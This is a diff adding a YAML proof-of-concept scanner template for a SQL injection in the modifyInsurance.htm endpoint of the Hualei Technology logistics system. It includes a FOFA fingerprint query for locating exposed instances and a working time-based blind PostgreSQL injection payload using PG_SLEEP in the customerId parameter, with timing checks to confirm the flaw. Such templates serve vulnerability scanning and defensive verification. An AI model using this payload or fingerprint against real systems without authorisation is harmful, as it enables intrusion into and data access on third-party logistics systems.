@@ -1,0 +1,19 @@
+id: poc-yaml-hualei-technology-modifyinsurance-sqli
+info:
+  name: 华磊科技物流系统 modifyInsurance SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 华磊科技物流系统
+  fofa: body="l_c_bar"||body="l_c_center"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId=
+  expression: status_code == 200 && contains(body,"客户ID不能为空")
+- method: GET
+  path: /modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId=1+AND+6269=(SELECT+6269+FROM+PG_SLEEP({{.t1}}))
+  expression: status_code == 200 && body == "" && duration > t1 && duration < t2
+transport: http
